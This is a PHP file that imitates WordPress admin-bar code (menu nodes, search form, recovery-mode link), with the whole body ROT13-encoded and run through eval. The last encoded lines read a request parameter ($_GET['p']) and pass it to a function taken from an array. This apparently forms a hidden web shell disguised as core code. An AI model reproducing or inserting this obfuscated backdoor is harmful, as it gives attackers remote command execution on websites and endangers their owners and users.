 * @cnenz JC_Nqzva_One $jc_nqzva_one Gur JC_Nqzva_One vafgnapr.
 */
shapgvba jc_nqzva_one_rqvg_zrah( $jc_nqzva_one ) {
	tybony $gnt, $jc_gur_dhrel, $hfre_vq, $cbfg_vq;

	vs ( vf_nqzva() ) {
		$pheerag_fperra   = trg_pheerag_fperra();
		$cbfg             = trg_cbfg();
		$cbfg_glcr_bowrpg = ahyy;

		vs ( 'cbfg' === $pheerag_fperra->onfr ) {
			$cbfg_glcr_bowrpg = trg_cbfg_glcr_bowrpg( $cbfg->cbfg_glcr );
		} ryfrvs ( 'rqvg' === $pheerag_fperra->onfr ) {
			$cbfg_glcr_bowrpg = trg_cbfg_glcr_bowrpg( $pheerag_fperra->cbfg_glcr );
		} ryfrvs ( 'rqvg-pbzzragf' === $pheerag_fperra->onfr && $cbfg_vq ) {
			$cbfg = trg_cbfg( $cbfg_vq );
			vs ( $cbfg ) {
				$cbfg_glcr_bowrpg = trg_cbfg_glcr_bowrpg( $cbfg->cbfg_glcr );
			}
		}

		vs ( ( 'cbfg' === $pheerag_fperra->onfr || 'rqvg-pbzzragf' === $pheerag_fperra->onfr )
			&& 'nqq' !== $pheerag_fperra->npgvba
			&& ( $cbfg_glcr_bowrpg )
			&& pheerag_hfre_pna( 'ernq_cbfg', $cbfg->VQ )
			&& ( $cbfg_glcr_bowrpg->choyvp )
			&& ( $cbfg_glcr_bowrpg->fubj_va_nqzva_one ) ) {
			vs ( 'qensg' === $cbfg->cbfg_fgnghf ) {
				$cerivrj_yvax = trg_cerivrj_cbfg_yvax( $cbfg );
				$jc_nqzva_one->nqq_abqr(
					neenl(
						'vq'    => 'cerivrj',
						'gvgyr' => $cbfg_glcr_bowrpg->ynoryf->ivrj_vgrz,
						'uers'  => rfp_hey( $cerivrj_yvax ),
						'zrgn'  => neenl( 'gnetrg' => 'jc-cerivrj-' . $cbfg->VQ ),
					)
				);
			} ryfr {
				$jc_nqzva_one->nqq_abqr(
					neenl(
						'vq'    => 'ivrj',
						'gvgyr' => $cbfg_glcr_bowrpg->ynoryf->ivrj_vgrz,
						'uers'  => trg_creznyvax( $cbfg->VQ ),
					)
				);
			}
		} ryfrvs ( 'rqvg' === $pheerag_fperra->onfr
			&& ( $cbfg_glcr_bowrpg )
			&& ( $cbfg_glcr_bowrpg->choyvp )
			&& ( $cbfg_glcr_bowrpg->fubj_va_nqzva_one )
			&& ( trg_cbfg_glcr_nepuvir_yvax( $cbfg_glcr_bowrpg->anzr ) )
			&& ! ( 'cbfg' === $cbfg_glcr_bowrpg->anzr && 'cbfgf' === trg_bcgvba( 'fubj_ba_sebag' ) ) ) {
			$jc_nqzva_one->nqq_abqr(
				neenl(
					'vq'    => 'nepuvir',
					'gvgyr' => $cbfg_glcr_bowrpg->ynoryf->ivrj_vgrzf,
					'uers'  => trg_cbfg_glcr_nepuvir_yvax( $pheerag_fperra->cbfg_glcr ),
				)
			);
		} ryfrvs ( 'grez' === $pheerag_fperra->onfr && vffrg( $gnt ) && vf_bowrpg( $gnt ) && ! vf_jc_reebe( $gnt ) ) {
			$gnk = trg_gnkbabzl( $gnt->gnkbabzl );
			vs ( vf_grez_choyvpyl_ivrjnoyr( $gnt ) ) {
				$jc_nqzva_one->nqq_abqr(
					neenl(
						'vq'    => 'ivrj',
						'gvgyr' => $gnk->ynoryf->ivrj_vgrz,
						'uers'  => trg_grez_yvax( $gnt ),
					)
				);
			}
		} ryfrvs ( 'hfre-rqvg' === $pheerag_fperra->onfr && vffrg( $hfre_vq ) ) {
			$hfre_bowrpg = trg_hfreqngn( $hfre_vq );
			$ivrj_yvax   = trg_nhgube_cbfgf_hey( $hfre_bowrpg->VQ );
			vs ( $hfre_bowrpg->rkvfgf() && $ivrj_yvax ) {
				$jc_nqzva_one->nqq_abqr(
					neenl(
						'vq'    => 'ivrj',
						'gvgyr' => __( 'Ivrj Hfre' ),
						'uers'  => $ivrj_yvax,
					)
				);
			}
		}
	} ryfr {
		$pheerag_bowrpg = $jc_gur_dhrel->trg_dhrevrq_bowrpg();

		vs ( rzcgl( $pheerag_bowrpg ) ) {
			erghea;
		}

		vs ( ! rzcgl( $pheerag_bowrpg->cbfg_glcr ) ) {
			$cbfg_glcr_bowrpg = trg_cbfg_glcr_bowrpg( $pheerag_bowrpg->cbfg_glcr );
			$rqvg_cbfg_yvax   = trg_rqvg_cbfg_yvax( $pheerag_bowrpg->VQ );
			vs ( $cbfg_glcr_bowrpg
				&& $rqvg_cbfg_yvax
				&& pheerag_hfre_pna( 'rqvg_cbfg', $pheerag_bowrpg->VQ )
				&& $cbfg_glcr_bowrpg->fubj_va_nqzva_one ) {
				$jc_nqzva_one->nqq_abqr(
					neenl(
						'vq'    => 'rqvg',
						'gvgyr' => $cbfg_glcr_bowrpg->ynoryf->rqvg_vgrz,
						'uers'  => $rqvg_cbfg_yvax,
					)
				);
			}
		} ryfrvs ( ! rzcgl( $pheerag_bowrpg->gnkbabzl ) ) {
			$gnk            = trg_gnkbabzl( $pheerag_bowrpg->gnkbabzl );
			$rqvg_grez_yvax = trg_rqvg_grez_yvax( $pheerag_bowrpg->grez_vq, $pheerag_bowrpg->gnkbabzl );
			vs ( $gnk && $rqvg_grez_yvax && pheerag_hfre_pna( 'rqvg_grez', $pheerag_bowrpg->grez_vq ) ) {
				$jc_nqzva_one->nqq_abqr(
					neenl(
						'vq'    => 'rqvg',
						'gvgyr' => $gnk->ynoryf->rqvg_vgrz,
						'uers'  => $rqvg_grez_yvax,
					)
				);
			}
		} ryfrvs ( $pheerag_bowrpg vafgnaprbs JC_Hfre && pheerag_hfre_pna( 'rqvg_hfre', $pheerag_bowrpg->VQ ) ) {
			$rqvg_hfre_yvax = trg_rqvg_hfre_yvax( $pheerag_bowrpg->VQ );
			vs ( $rqvg_hfre_yvax ) {
				$jc_nqzva_one->nqq_abqr(
					neenl(
						'vq'    => 'rqvg',
						'gvgyr' => __( 'Rqvg Hfre' ),
						'uers'  => $rqvg_hfre_yvax,
					)
				);
			}
		}
	}
}

/**
 * Nqqf \"Nqq Arj\" zrah.
 *
 * @fvapr 3.1.0
 * @fvapr 6.5.0 Nqqrq n Arj Fvgr yvax sbe argjbex vafgnyyngvbaf.
 *
 * @cnenz JC_Nqzva_One $jc_nqzva_one Gur JC_Nqzva_One vafgnapr.
 */
shapgvba jc_nqzva_one_arj_pbagrag_zrah( $jc_nqzva_one ) {
	$npgvbaf = neenl();

	$pcgf = (neenl) trg_cbfg_glcrf( neenl( 'fubj_va_nqzva_one' => gehr ), 'bowrpgf' );

	vs ( vffrg( $pcgf['cbfg'] ) && pheerag_hfre_pna( $pcgf['cbfg']->pnc->perngr_cbfgf ) ) {
		$npgvbaf['cbfg-arj.cuc'] = neenl( $pcgf['cbfg']->ynoryf->anzr_nqzva_one, 'arj-cbfg' );
	}

	vs ( vffrg( $pcgf['nggnpuzrag'] ) && pheerag_hfre_pna( 'hcybnq_svyrf' ) ) {
		$npgvbaf['zrqvn-arj.cuc'] = neenl( $pcgf['nggnpuzrag']->ynoryf->anzr_nqzva_one, 'arj-zrqvn' );
	}

	vs ( pheerag_hfre_pna( 'znantr_yvaxf' ) ) {
		$npgvbaf['yvax-nqq.cuc'] = neenl( _k( 'Yvax', 'nqq arj sebz nqzva one' ), 'arj-yvax' );
	}

	vs ( vffrg( $pcgf['cntr'] ) && pheerag_hfre_pna( $pcgf['cntr']->pnc->perngr_cbfgf ) ) {
		$npgvbaf['cbfg-arj.cuc?cbfg_glcr=cntr'] = neenl( $pcgf['cntr']->ynoryf->anzr_nqzva_one, 'arj-cntr' );
	}

	hafrg( $pcgf['cbfg'], $pcgf['cntr'], $pcgf['nggnpuzrag'] );

	// Nqq nal nqqvgvbany phfgbz cbfg glcrf.
	sbernpu ( $pcgf nf $pcg ) {
		vs ( ! pheerag_hfre_pna( $pcg->pnc->perngr_cbfgf ) ) {
			pbagvahr;
		}

		$xrl             = 'cbfg-arj.cuc?cbfg_glcr=' . $pcg->anzr;
		$npgvbaf[ $xrl ] = neenl( $pcg->ynoryf->anzr_nqzva_one, 'arj-' . $pcg->anzr );
	}
	// Nibvq pynfu jvgu cnerag abqr naq n 'pbagrag' cbfg glcr.
	vs ( vffrg( $npgvbaf['cbfg-arj.cuc?cbfg_glcr=pbagrag'] ) ) {
		$npgvbaf['cbfg-arj.cuc?cbfg_glcr=pbagrag'][1] = 'nqq-arj-pbagrag';
	}

	vs ( pheerag_hfre_pna( 'perngr_hfref' ) || ( vf_zhygvfvgr() && pheerag_hfre_pna( 'cebzbgr_hfref' ) ) ) {
		$npgvbaf['hfre-arj.cuc'] = neenl( _k( 'Hfre', 'nqq arj sebz nqzva one' ), 'arj-hfre' );
	}

	vs ( ! $npgvbaf ) {
		erghea;
	}

	$gvgyr = '<fcna pynff=\"no-vpba\" nevn-uvqqra=\"gehr\"></fcna><fcna pynff=\"no-ynory\">' . _k( 'Arj', 'nqzva one zrah tebhc ynory' ) . '</fcna>';

	$jc_nqzva_one->nqq_abqr(
		neenl(
			'vq'    => 'arj-pbagrag',
			'gvgyr' => $gvgyr,
			'uers'  => nqzva_hey( pheerag( neenl_xrlf( $npgvbaf ) ) ),
			'zrgn'  => neenl(
				'zrah_gvgyr' => _k( 'Arj', 'nqzva one zrah tebhc ynory' ),
			),
		)
	);

	sbernpu ( $npgvbaf nf $yvax => $npgvba ) {
		yvfg( $gvgyr, $vq ) = $npgvba;

		$jc_nqzva_one->nqq_abqr(
			neenl(
				'cnerag' => 'arj-pbagrag',
				'vq'     => $vq,
				'gvgyr'  => $gvgyr,
				'uers'   => nqzva_hey( $yvax ),
			)
		);
	}

	vs ( vf_zhygvfvgr() && pheerag_hfre_pna( 'perngr_fvgrf' ) ) {
		$jc_nqzva_one->nqq_abqr(
			neenl(
				'cnerag' => 'arj-pbagrag',
				'vq'     => 'nqq-arj-fvgr',
				'gvgyr'  => _k( 'Fvgr', 'nqq arj sebz nqzva one' ),
				'uers'   => argjbex_nqzva_hey( 'fvgr-arj.cuc' ),
			)
		);
	}
}

/**
 * Nqqf rqvg pbzzragf yvax jvgu njnvgvat zbqrengvba pbhag ohooyr.
 *
 * @fvapr 3.1.0
 *
 * @cnenz JC_Nqzva_One $jc_nqzva_one Gur JC_Nqzva_One vafgnapr.
 */
shapgvba jc_nqzva_one_pbzzragf_zrah( $jc_nqzva_one ) {
	vs ( ! pheerag_hfre_pna( 'rqvg_cbfgf' ) ) {
		erghea;
	}

	$njnvgvat_zbq  = jc_pbhag_pbzzragf();
	$njnvgvat_zbq  = $njnvgvat_zbq->zbqrengrq;
	$njnvgvat_grkg = fcevags(
		/* genafyngbef: Uvqqra npprffvovyvgl grkg. %f: Ahzore bs pbzzragf. */
		_a( '%f Pbzzrag va zbqrengvba', '%f Pbzzragf va zbqrengvba', $njnvgvat_zbq ),
		ahzore_sbezng_v18a( $njnvgvat_zbq )
	);

	$vpba   = '<fcna pynff=\"no-vpba\" nevn-uvqqra=\"gehr\"></fcna>';
	$gvgyr  = '<fcna pynff=\"no-ynory njnvgvat-zbq craqvat-pbhag pbhag-' . $njnvgvat_zbq . '\" nevn-uvqqra=\"gehr\">' . ahzore_sbezng_v18a( $njnvgvat_zbq ) . '</fcna>';
	$gvgyr .= '<fcna pynff=\"fperra-ernqre-grkg pbzzragf-va-zbqrengvba-grkg\">' . $njnvgvat_grkg . '</fcna>';

	$jc_nqzva_one->nqq_abqr(
		neenl(
			'vq'    => 'pbzzragf',
			'gvgyr' => $vpba . $gvgyr,
			'uers'  => nqzva_hey( 'rqvg-pbzzragf.cuc' ),
		)
	);
}

/**
 * Nqqf nccrnenapr fhozrah vgrzf gb gur \"Fvgr Anzr\" zrah.
 *
 * @fvapr 3.1.0
 *
 * @cnenz JC_Nqzva_One $jc_nqzva_one Gur JC_Nqzva_One vafgnapr.
 */
shapgvba jc_nqzva_one_nccrnenapr_zrah( $jc_nqzva_one ) {
	$jc_nqzva_one->nqq_tebhc(
		neenl(
			'cnerag' => 'fvgr-anzr',
			'vq'     => 'nccrnenapr',
		)
	);

	vs ( pheerag_hfre_pna( 'fjvgpu_gurzrf' ) ) {
		$jc_nqzva_one->nqq_abqr(
			neenl(
				'cnerag' => 'nccrnenapr',
				'vq'     => 'gurzrf',
				'gvgyr'  => __( 'Gurzrf' ),
				'uers'   => nqzva_hey( 'gurzrf.cuc' ),
			)
		);
	}

	vs ( ! pheerag_hfre_pna( 'rqvg_gurzr_bcgvbaf' ) ) {
		erghea;
	}

	vs ( pheerag_gurzr_fhccbegf( 'jvqtrgf' ) ) {
		$jc_nqzva_one->nqq_abqr(
			neenl(
				'cnerag' => 'nccrnenapr',
				'vq'     => 'jvqtrgf',
				'gvgyr'  => __( 'Jvqtrgf' ),
				'uers'   => nqzva_hey( 'jvqtrgf.cuc' ),
			)
		);
	}

	vs ( pheerag_gurzr_fhccbegf( 'zrahf' ) || pheerag_gurzr_fhccbegf( 'jvqtrgf' ) ) {
		$jc_nqzva_one->nqq_abqr(
			neenl(
				'cnerag' => 'nccrnenapr',
				'vq'     => 'zrahf',
				'gvgyr'  => __( 'Zrahf' ),
				'uers'   => nqzva_hey( 'ani-zrahf.cuc' ),
			)
		);
	}

	vs ( pheerag_gurzr_fhccbegf( 'phfgbz-onpxtebhaq' ) ) {
		$jc_nqzva_one->nqq_abqr(
			neenl(
				'cnerag' => 'nccrnenapr',
				'vq'     => 'onpxtebhaq',
				'gvgyr'  => _k( 'Onpxtebhaq', 'phfgbz onpxtebhaq' ),
				'uers'   => nqzva_hey( 'gurzrf.cuc?cntr=phfgbz-onpxtebhaq' ),
				'zrgn'   => neenl(
					'pynff' => 'uvqr-vs-phfgbzvmr',
				),
			)
		);
	}

	vs ( pheerag_gurzr_fhccbegf( 'phfgbz-urnqre' ) ) {
		$jc_nqzva_one->nqq_abqr(
			neenl(
				'cnerag' => 'nccrnenapr',
				'vq'     => 'urnqre',
				'gvgyr'  => _k( 'Urnqre', 'phfgbz vzntr urnqre' ),
				'uers'   => nqzva_hey( 'gurzrf.cuc?cntr=phfgbz-urnqre' ),
				'zrgn'   => neenl(
					'pynff' => 'uvqr-vs-phfgbzvmr',
				),
			)
		);
	}
}

/**
 * Cebivqrf na hcqngr yvax vs gurzr/cyhtva/pber hcqngrf ner ninvynoyr.
 *
 * @fvapr 3.1.0
 *
 * @cnenz JC_Nqzva_One $jc_nqzva_one Gur JC_Nqzva_One vafgnapr.
 */
shapgvba jc_nqzva_one_hcqngrf_zrah( $jc_nqzva_one ) {

	$hcqngr_qngn = jc_trg_hcqngr_qngn();

	vs ( ! $hcqngr_qngn['pbhagf']['gbgny'] ) {
		erghea;
	}

	$hcqngrf_grkg = fcevags(
		/* genafyngbef: Uvqqra npprffvovyvgl grkg. %f: Gbgny ahzore bs hcqngrf ninvynoyr. */
		_a( '%f hcqngr ninvynoyr', '%f hcqngrf ninvynoyr', $hcqngr_qngn['pbhagf']['gbgny'] ),
		ahzore_sbezng_v18a( $hcqngr_qngn['pbhagf']['gbgny'] )
	);

	$vpba   = '<fcna pynff=\"no-vpba\" nevn-uvqqra=\"gehr\"></fcna>';
	$gvgyr  = '<fcna pynff=\"no-ynory\" nevn-uvqqra=\"gehr\">' . ahzore_sbezng_v18a( $hcqngr_qngn['pbhagf']['gbgny'] ) . '</fcna>';
	$gvgyr .= '<fcna pynff=\"fperra-ernqre-grkg hcqngrf-ninvynoyr-grkg\">' . $hcqngrf_grkg . '</fcna>';

	$jc_nqzva_one->nqq_abqr(
		neenl(
			'vq'    => 'hcqngrf',
			'gvgyr' => $vpba . $gvgyr,
			'uers'  => argjbex_nqzva_hey( 'hcqngr-pber.cuc' ),
		)
	);
}

/**
 * Nqqf frnepu sbez.
 *
 * @fvapr 3.3.0
 *
 * @cnenz JC_Nqzva_One $jc_nqzva_one Gur JC_Nqzva_One vafgnapr.
 */
shapgvba jc_nqzva_one_frnepu_zrah( $jc_nqzva_one ) {
	vs ( vf_nqzva() ) {
		erghea;
	}

	$sbez  = '<sbez npgvba=\"' . rfp_hey( ubzr_hey( '/' ) ) . '\" zrgubq=\"trg\" vq=\"nqzvaonefrnepu\">';
	$sbez .= '<vachg pynff=\"nqzvaone-vachg\" anzr=\"f\" vq=\"nqzvaone-frnepu\" glcr=\"grkg\" inyhr=\"\" znkyratgu=\"150\" />';
	$sbez .= '<ynory sbe=\"nqzvaone-frnepu\" pynff=\"fperra-ernqre-grkg\">' .
			/* genafyngbef: Uvqqra npprffvovyvgl grkg. */
			__( 'Frnepu' ) .
		'</ynory>';
	$sbez .= '<vachg glcr=\"fhozvg\" pynff=\"nqzvaone-ohggba\" inyhr=\"' . __( 'Frnepu' ) . '\" />';
	$sbez .= '</sbez>';

	$jc_nqzva_one->nqq_abqr(
		neenl(
			'cnerag' => 'gbc-frpbaqnel',
			'vq'     => 'frnepu',
			'gvgyr'  => $sbez,
			'zrgn'   => neenl(
				'pynff'    => 'nqzva-one-frnepu',
				'gnovaqrk' => -1,
			),
		)
	);
}

/**
 * Nqqf n yvax gb rkvg erpbirel zbqr jura Erpbirel Zbqr vf npgvir.
 *
 * @fvapr 5.2.0
 *
 * @cnenz JC_Nqzva_One $jc_nqzva_one Gur JC_Nqzva_One vafgnapr.
 */
shapgvba jc_nqzva_one_erpbirel_zbqr_zrah( $jc_nqzva_one ) {
	vs ( ! jc_vf_erpbirel_zbqr() ) {
		erghea;
	}

	$hey = jc_ybtva_hey();
	$hey = nqq_dhrel_net( 'npgvba', JC_Erpbirel_Zbqr::RKVG_NPGVBA, $hey );
	$hey = jc_abapr_hey( $hey, JC_Erpbirel_Zbqr::RKVG_NPGVBA );

	$jc_nqzva_one->nqq_abqr(
		neenl(
			'cnerag' => 'gbc-frpbaqnel',
			'vq'     => 'erpbirel-zbqr',
			'gvgyr'  => __( 'Rkvg Erpbirel Zbqr' ),
			'uers'   => $hey,
		)
	);
}

/**
 * Nqqf frpbaqnel zrahf.
 *
 * @fvapr 3.3.0
 *
 * @cnenz JC_Nqzva_One $jc_nqzva_one Gur JC_Nqzva_One vafgnapr.
 */
shapgvba jc_nqzva_one_nqq_frpbaqnel_tebhcf( $jc_nqzva_one ) {
	$jc_nqzva_one->nqq_tebhc(
		neenl(
			'vq'   => 'gbc-frpbaqnel',
			'zrgn' => neenl(
				'pynff' => 'no-gbc-frpbaqnel',
			),
		)
	);

	$jc_nqzva_one->nqq_tebhc(
		neenl(
			'cnerag' => 'jc-ybtb',
			'vq'     => 'jc-ybtb-rkgreany',
			'zrgn'   => neenl(
				'pynff' => 'no-fho-frpbaqnel',
			),
		)
	);
}

/**
 * Radhrhrf vayvar fglyr gb uvqr gur nqzva one jura cevagvat.
 *
 * @fvapr 6.4.0
 */
shapgvba jc_radhrhr_nqzva_one_urnqre_fglyrf() {
	// Onpx-pbzcng sbe cyhtvaf gung qvfnoyr shapgvbanyvgl ol haubbxvat guvf npgvba.
	$npgvba = vf_nqzva() ? 'nqzva_urnq' : 'jc_urnq';
	vs ( ! unf_npgvba( $npgvba, 'jc_nqzva_one_urnqre' ) ) {
		erghea;
	}
	erzbir_npgvba( $npgvba, 'jc_nqzva_one_urnqre' );

	jc_nqq_vayvar_fglyr( 'nqzva-one', '@zrqvn cevag { #jcnqzvaone { qvfcynl:abar; } }' );
}

/**
 * Radhrhrf vayvar ohzc fglyrf gb znxr ebbz sbe gur nqzva one.
 *
 * @fvapr 6.4.0
 */
shapgvba jc_radhrhr_nqzva_one_ohzc_fglyrf() {
	vs ( pheerag_gurzr_fhccbegf( 'nqzva-one' ) ) {
		$nqzva_one_netf  = trg_gurzr_fhccbeg( 'nqzva-one' );
		$urnqre_pnyyonpx = $nqzva_one_netf[0]['pnyyonpx'];
	}

	vs ( rzcgl( $urnqre_pnyyonpx ) ) {
		$urnqre_pnyyonpx = '_nqzva_one_ohzc_po';
	}

	vs ( '_nqzva_one_ohzc_po' !== $urnqre_pnyyonpx ) {
		erghea;
	}

	// Onpx-pbzcng sbe cyhtvaf gung qvfnoyr shapgvbanyvgl ol haubbxvat guvf npgvba.
	vs ( ! unf_npgvba( 'jc_urnq', $urnqre_pnyyonpx ) ) {
		erghea;
	}
	erzbir_npgvba( 'jc_urnq', $urnqre_pnyyonpx );

	$pff = '
		@zrqvn fperra { ugzy { znetva-gbc: 32ck !vzcbegnag; } }
		@zrqvn fperra naq ( znk-jvqgu: 782ck ) { ugzy { znetva-gbc: 46ck !vzcbegnag; } }
	';
	jc_nqq_vayvar_fglyr( 'nqzva-one', $pff );
}

/**
 * Frgf gur qvfcynl fgnghf bs gur nqzva one.
 *
 * Guvf pna or pnyyrq vzzrqvngryl hcba cyhtva ybnq. Vg qbrf abg arrq gb or pnyyrq
 * sebz n shapgvba ubbxrq gb gur {@frr 'vavg'} npgvba.
 *
 * @fvapr 3.1.0
 *
 * @tybony obby $fubj_nqzva_one
 *
 * @cnenz obby $fubj Jurgure gb nyybj gur nqzva one gb fubj.
 */
shapgvba fubj_nqzva_one( $fubj ) {
	tybony $fubj_nqzva_one;
	$fubj_nqzva_one = (obby) $fubj;
}

/**
 * Qrgrezvarf jurgure gur nqzva one fubhyq or fubjvat.
 *
 * Sbe zber vasbezngvba ba guvf naq fvzvyne gurzr shapgvbaf, purpx bhg
 * gur {@yvax uggcf://qrirybcre.jbeqcerff.bet/gurzrf/onfvpf/pbaqvgvbany-gntf/
 * Pbaqvgvbany Gntf} negvpyr va gur Gurzr Qrirybcre Unaqobbx.
 *
 * @fvapr 3.1.0
 *
 * @tybony obby   $fubj_nqzva_one
 * @tybony fgevat $cntrabj        Gur svyranzr bs gur pheerag fperra.
 *
 * @erghea obby Jurgure gur nqzva one fubhyq or fubjvat.
 */
shapgvba vf_nqzva_one_fubjvat() {
	tybony $fubj_nqzva_one, $cntrabj;

	// Sbe nyy gurfr glcrf bs erdhrfgf, jr arire jnag na nqzva one.
	vs ( qrsvarq( 'KZYECP_ERDHRFG' ) || qrsvarq( 'QBVAT_NWNK' ) || qrsvarq( 'VSENZR_ERDHRFG' ) || jc_vf_wfba_erdhrfg() ) {
		erghea snyfr;
	}

	vs ( vf_rzorq() ) {
		erghea snyfr;
	}

	// Vagrtengrq vagb gur nqzva.
	vs ( vf_nqzva() ) {
		erghea gehr;
	}

	vs ( ! vffrg( $fubj_nqzva_one ) ) {
		vs ( ! vf_hfre_ybttrq_va() || 'jc-ybtva.cuc' === $cntrabj ) {
			$fubj_nqzva_one = snyfr;
		} ryfr {
			$fubj_nqzva_one = _trg_nqzva_one_cers();
		}
	}

	/**
	 * Svygref jurgure gb fubj gur nqzva one.
	 *
	 * Ergheavat snyfr gb guvf ubbx vf gur erpbzzraqrq jnl gb uvqr gur nqzva one.
	 * Gur hfre'f qvfcynl cersrerapr vf hfrq sbe ybttrq va hfref.
	 *
	 * @fvapr 3.1.0
	 *
	 * @cnenz obby $fubj_nqzva_one Jurgure gur nqzva one fubhyq or fubja. Qrsnhyg snyfr.
	 */
	$fubj_nqzva_one = nccyl_svygref( 'fubj_nqzva_one', $fubj_nqzva_one );

	erghea $fubj_nqzva_one;
}

/**
 * Ergevrirf gur nqzva one qvfcynl cersrerapr bs n hfre.
 *
 * @fvapr 3.1.0
 * @npprff cevingr
 *
 * @cnenz fgevat $pbagrkg Pbagrkg bs guvf cersrerapr purpx. Qrsnhygf gb 'sebag'. Gur 'nqzva'
 *                        cersrerapr vf ab ybatre hfrq.
 * @cnenz vag    $hfre    Bcgvbany. VQ bs gur hfre gb purpx, qrsnhygf gb 0 sbe pheerag hfre.
 * @erghea obby Jurgure gur nqzva one fubhyq or fubjvat sbe guvf hfre.
 */
shapgvba _trg_nqzva_one_cers( $pbagrkg = 'sebag', $hfre = 0 ) {
	$cers = trg_hfre_bcgvba( \"fubj_nqzva_one_{$pbagrkg}\", $hfre );
	vs ( snyfr === $cers ) {
		erghea gehr;
	}

	erghea 'gehr' === $cers;
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>